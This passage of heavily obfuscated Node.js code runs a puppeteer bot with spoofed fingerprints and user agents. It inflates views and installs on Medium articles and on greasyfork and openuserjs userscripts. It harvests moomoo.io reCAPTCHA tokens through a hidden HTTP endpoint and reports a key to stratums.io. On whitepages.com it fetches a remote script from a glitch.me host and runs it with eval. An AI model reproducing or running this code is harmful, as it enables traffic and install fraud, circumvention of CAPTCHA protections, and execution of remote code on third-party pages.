      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + U(0xa) + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + U(0x9) + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + U(0x19) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + U(0xc) + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * 0x24fb + 0x1dc5 * -0x1 + -0x736
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x7db + 0x897 * -0x4 + 0x1a81)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x639 + -0x116 * 0x4 + 0xaf5), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xbe2 + -0xae6 + 0x8 * -0x13), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x105f + -0x913 * -0x1 + -0x1 * -0x74c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x3 * 0x3b5 + -0x194e + 0x1 * 0xe2f; w < getRandomInt(0x73d + 0x1 * -0x216e + 0x1a32, 0x1 * 0x1897 + 0x1 * -0xf1b + 0x977 * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * -0x14513 + -0x7 * 0x848 + 0x39 * -0x93);
        }
      }();
    }, 0x22bd + 0x22df * -0x1 + 0x86 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1862 + -0xbb0 + -0x2 * 0x659;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1136 * -0x2 + 0x1308 + 0xd5d * -0x4, -0x25c1 * 0x1 + 0x1421 * 0x1 + -0x8e9 * -0x2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x47bf + -0xe09f + 0x19d8e);
    }, -0x16 * 0x65 + -0x2109 + -0x1 * -0x2a1b), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xa31 + 0x2 * 0xa4 + -0x1 * 0xb79;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * -0x1ffb + -0x198d + 0x54a), await u['evaluate'](() => {
            const X = b;
            let v = new XMLHttpRequest();
            v['open']('GET', X(0x1a, 'BABw') + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x6d * 0xa + -0x12c6 + -0x3a1 * -0x4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1699 * -0x53 + -0xa7237 * -0x2 + 0x4d423 * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x26f2 + 0x21 * 0x39 + 0x1af * 0x13);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x3fb + 0xdee + -0x92b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x4 * -0xdeb + -0x27ec + 0x7f28);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d,
    a0 = c;
  async function f() {
    const Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x9eb + -0x1 * 0x1864 + 0x2250) {
        const Y = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + Y(0xd, ')0Zq')['length'] + (0x25d0 + 0x204d + -0x461c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x9a3 + -0x450 + 0xdf3, D['indexOf']('\x20'));
        return B ? E['slice'](-0xf3d + -0xadc + -0x3 * -0x8b3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x46ac + 0x2d2f + 0x408d),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1f * -0x3b + 0x9 * 0x726 + -0x2b * 0xc1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object[Z(0x8, 'qKOY')](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + a0(0x12) + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + a1(0x1d) + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      a2(0x13, 'WZOE') + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      a1(0x11) + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + a1(0x1) + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      a0(0xf) + 'enuserjs.o' + a1(0x18) + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      a2(0x1c, 'Oi]h') + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + a1(0x18) + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + a1(0x1b) + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * -0x236b + 0x3b * 0x61 + -0x39c6; k < -0x1089 + 0x2071 + -0x1 * 0xfe4; k++)
    setTimeout(f, (0x1 * -0x6853 + -0x3 * 0x71b0 + -0x2a7c3 * -0x1) * k * getRandomInt(0xa3 * -0x11 + 0xdfa * -0x1 + 0x1 * 0x18ce, -0x1d * -0x112 + 0x4 * 0xee + 0xf * -0x251));
  setInterval(() => {
    f();
    for (let l = 0x2 * -0x272 + 0x418 + 0x3 * 0x44; l < 0x20e2 + 0x32 * 0x80 + 0x1cef * -0x2; l++)
      setTimeout(f, (0x10b4d + 0x995c + 0xba49 * -0x1) * l * getRandomInt(0x86d + 0x185 * -0x5 + -0xd3, 0x193c + 0x1 * 0x1364 + -0x2c9d));
